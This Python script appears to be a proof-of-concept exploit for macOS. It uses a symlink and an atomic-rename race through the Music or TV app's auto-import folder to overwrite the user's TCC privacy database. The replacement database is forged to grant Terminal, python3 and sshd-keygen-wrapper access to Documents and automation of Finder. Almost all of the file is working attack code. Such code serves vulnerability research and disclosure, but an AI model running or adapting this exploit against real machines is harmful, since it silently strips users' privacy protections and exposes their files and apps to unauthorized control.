#!/usr/bin/python3

import sys
import os
import shutil
import ctypes
import subprocess
import time


HOMEDIR = "/Users/{}/".format(os.environ["USER"])
PAYLOADFILE = "TCC.db"		# this filename determines the filename in dst

TARGET_DIR = "{}/Library/Application Support/com.apple.TCC".format(HOMEDIR)
SRCFILE = "TCC.db"
CHECK_FILE = os.path.join(TARGET_DIR, SRCFILE)

SLEEPTIME = 3


origprint = print
def myprint(*args):
	if DEBUG:
		origprint(*args)
print = myprint

# globals
if os.environ.get("DEBUG") is not None:
	DEBUG = bool(int(os.environ["DEBUG"]))
else:
	DEBUG = False


# START renameatx_np
libc = ctypes.CDLL(None, use_errno=True)

AT_FDCWD = 0xfffffffe
RENAME_SWAP = 0x00000002

renameatx_np = libc.renameatx_np
renameatx_np.restype = ctypes.c_int
renameatx_np.argtypes = [
	ctypes.c_int,
	ctypes.c_char_p,
	ctypes.c_int,
	ctypes.c_char_p,
	ctypes.c_uint,
]

def atomic_rename(src, dst):
	src_c = ctypes.c_char_p(src.encode())
	dst_c = ctypes.c_char_p(dst.encode())

	ret = renameatx_np(AT_FDCWD, src_c, AT_FDCWD, dst_c, RENAME_SWAP)
	if ret != 0:
#		print("RENAME ERROR", ret)
		raise RuntimeError("ERROR")
# END


### TCC db generator (not important)
# TCC db to be generated...
TCC_SQLDATA = """
	PRAGMA foreign_keys=OFF;
	BEGIN TRANSACTION;
	CREATE TABLE admin (key TEXT PRIMARY KEY NOT NULL, value INTEGER NOT NULL);
	INSERT INTO admin VALUES('version',23);
	CREATE TABLE policies (    id	INTEGER    NOT NULL PRIMARY KEY,     bundle_id    TEXT    NOT NULL,     uuid	TEXT    NOT NULL,     display	TEXT    NOT NULL,     UNIQUE (bundle_id, uuid));
	CREATE TABLE active_policy (    client	TEXT    NOT NULL,     client_type    INTEGER    NOT NULL,     policy_id    INTEGER NOT NULL,     PRIMARY KEY (client, client_type),     FOREIGN KEY (policy_id) REFERENCES policies(id) ON DELETE CASCADE ON UPDATE CASCADE);
	CREATE TABLE access (    service	TEXT	NOT NULL,     client	 TEXT	NOT NULL,     client_type    INTEGER     NOT NULL,     auth_value     INTEGER     NOT NULL,     auth_reason    INTEGER     NOT NULL,     auth_version   INTEGER     NOT NULL,     csreq	  BLOB,     policy_id      INTEGER,     indirect_object_identifier_type    INTEGER,     indirect_object_identifier	 TEXT NOT NULL DEFAULT 'UNUSED',     indirect_object_code_identity      BLOB,     flags	  INTEGER,     last_modified  INTEGER     NOT NULL DEFAULT (CAST(strftime('%s','now') AS INTEGER)),     PRIMARY KEY (service, client, client_type, indirect_object_identifier),    FOREIGN KEY (policy_id) REFERENCES policies(id) ON DELETE CASCADE ON UPDATE CASCADE);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.shortcuts',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.securityd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.cloudpaird',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.identityservicesd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.suggestd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.Safari',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.sociallayerd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.upload-request-proxy.com.apple.photos.cloud',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.iad-cloudkit',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.assistant.assistantd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.ScreenTimeAgent',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.syncdefaultsd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.donotdisturbd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.siriknowledged',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.appleaccountd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.passd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.amsaccountsd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.icloud.searchpartyuseragent',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.willowd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.remindd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.cloudphotod',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.amsengagementd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937173);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.StatusKitAgent',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937182);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.Passbook',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937182);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.routined',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937182);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.knowledge-agent',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937184);
	INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.textinput.KeyboardServices',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937199);
	INSERT INTO access VALUES('kTCCServiceSystemPolicyDocumentsFolder','com.apple.Terminal',0,2,2,1,X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',NULL,NULL,'UNUSED',NULL,0,1670953394);
	INSERT INTO access VALUES('kTCCServiceSystemPolicyDocumentsFolder','/usr/libexec/sshd-keygen-wrapper',1,2,2,1,X'fade0c000000003c0000000100000006000000020000001d636f6d2e6170706c652e737368642d6b657967656e2d7772617070657200000000000003',NULL,NULL,'UNUSED',NULL,0,1670953636);
	INSERT INTO access VALUES('kTCCServiceSystemPolicyDocumentsFolder','/usr/bin/python3',1,2,2,1,X'fade0c000000003c0000000100000006000000020000001d636f6d2e6170706c652e737368642d6b657967656e2d7772617070657200000000000003',NULL,NULL,'UNUSED',NULL,0,1670953636);
	INSERT INTO access VALUES('kTCCServiceSystemPolicyDocumentsFolder','pwned by @gergelykalman',1,2,2,1,X'fade0c000000003c0000000100000006000000020000001d636f6d2e6170706c652e737368642d6b657967656e2d7772617070657200000000000003',NULL,NULL,'UNUSED',NULL,0,1670953636);
	INSERT INTO access VALUES('kTCCServiceAppleEvents','com.apple.Terminal',0,2,3,1,X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',NULL,0,'com.apple.finder',X'fade0c000000002c00000001000000060000000200000010636f6d2e6170706c652e66696e64657200000003',NULL,1670953426);
	INSERT INTO access VALUES('kTCCServiceAppleEvents','/usr/libexec/sshd-keygen-wrapper',1,2,3,1,X'fade0c000000003c0000000100000006000000020000001d636f6d2e6170706c652e737368642d6b657967656e2d7772617070657200000000000003',NULL,0,'com.apple.finder',X'fade0c000000002c00000001000000060000000200000010636f6d2e6170706c652e66696e64657200000003',NULL,1670953638);
	CREATE TABLE access_overrides (    service	TEXT    NOT NULL PRIMARY KEY);
	CREATE TABLE expired (    service	TEXT	NOT NULL,     client	 TEXT	NOT NULL,     client_type    INTEGER     NOT NULL,     csreq	  BLOB,     last_modified  INTEGER     NOT NULL ,     expired_at     INTEGER     NOT NULL DEFAULT (CAST(strftime('%s','now') AS INTEGER)),     PRIMARY KEY (service, client, client_type));
	CREATE INDEX active_policy_id ON active_policy(policy_id);
	COMMIT;
	"""

def generate_tccdb(tcc_dbfile):
	tcc_sql = "tcc_sql.txt"
	with open(tcc_sql, "w") as f:
		f.write(TCC_SQLDATA)

	if os.path.exists(tcc_dbfile):
		os.unlink(tcc_dbfile)

	p = subprocess.Popen("cat \"{}\" | sqlite3 \"{}\"".format(tcc_sql, tcc_dbfile), shell=True)
	p.wait()

	os.unlink(tcc_sql)

### END


def main(app):
	# set app-specific parameters
	if app == "1":
		watchpath = "{}/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized".format(HOMEDIR)
		drop_dir = "{}/Music/Music/Media.localized/Automatically Add to Music.localized/".format(HOMEDIR)
		appname = "Music"
		apppath = "/System/Applications/Music.app/Contents/MacOS/Music"
	else:
		# tv
		watchpath = "{}/Movies/TV/Media.localized/Automatically Add to TV.localized/Not Added.localized".format(HOMEDIR)
		drop_dir = "{}/Movies/TV/Media.localized/Automatically Add to TV.localized/".format(HOMEDIR)
		appname = "TV"
		apppath = "/System/Applications/TV.app/Contents/MacOS/TV"

	print("[+] Cleaning up")
	if not os.path.exists(drop_dir):
		os.makedirs(drop_dir)
	os.chdir(drop_dir)
	os.system("killall -q {}".format(appname))
	if os.path.exists(watchpath):
		shutil.rmtree(watchpath, ignore_errors=False)

	symlinkpath = os.getcwd() + "/" + "tmp"

	print("[+] Generating TCC.db")
	if os.path.exists("TCC.db"):
		os.unlink("TCC.db")
	generate_tccdb(PAYLOADFILE)

	print("[+] Checking original file")
	orig_inode = os.stat(CHECK_FILE).st_ino
	print("[?] Original inode: {}".format(orig_inode))

	print("[+] Creating file and symlink")
	if os.path.exists(symlinkpath):
		if os.path.isdir(symlinkpath):
			shutil.rmtree(symlinkpath)
		else:
			os.unlink(symlinkpath)
	os.symlink(TARGET_DIR, symlinkpath)

	print("[+] Trigger")
	data = open(PAYLOADFILE, "rb").read()
	f = open(drop_dir + "/" + SRCFILE, "wb")
	f.write(data)
	f.flush()
	f.seek(0, 0)
	# NOTE: we could keep this open and modify after a successful race
	f.close()

	p = subprocess.Popen(
		[apppath],
		stdout=subprocess.DEVNULL,
		stderr=subprocess.DEVNULL,
	)

	print("[+] Waiting for dir creation")
	while not os.path.exists(watchpath):
		pass

	print("[+] Waiting for new directory creation")
	while True:
		dirlist = os.listdir(watchpath)
		if len(dirlist) > 1:
			break

	# print(dirlist)
	for i in dirlist:
		if i == ".localized":
			continue

		src = os.path.join(watchpath, i)
		dst = symlinkpath
		print("[?] \"{}\" -> \"{}\"".format(src, dst))
		try:
			atomic_rename(src, dst)
		except Exception as exc:
			print("ERROR: {}".format(exc))	
		break

	print("[+] Switched")

	time.sleep(SLEEPTIME)

	p.terminate()
	p.wait()

	# NOTE: disabled for now
	# f.truncate(0)
	# f.write(b'X'*1337)
	# f.flush()

	new_inode = os.stat(CHECK_FILE).st_ino
	if new_inode == orig_inode:
		print("[-] Fail, inode is the same :(")
		exit(1)
	
	print("[+] SUCCESS! Inode changed {} -> {}".format(orig_inode, new_inode))
	os.system("ls -ali \"{}/Library/Application Support/com.apple.TCC/TCC.db\"".format(HOMEDIR))

	print("[+] Check permissions: you can\n\t- access Documents\n\t- Automate Finder (TCC bypass)")


if __name__ == "__main__":
	if len(sys.argv) < 2 or sys.argv[1] not in ("1", "2"):
		origprint("Usage: {} (1|2)".format(sys.argv[0]))
		exit(1)
	app = sys.argv[1]
	main(app)

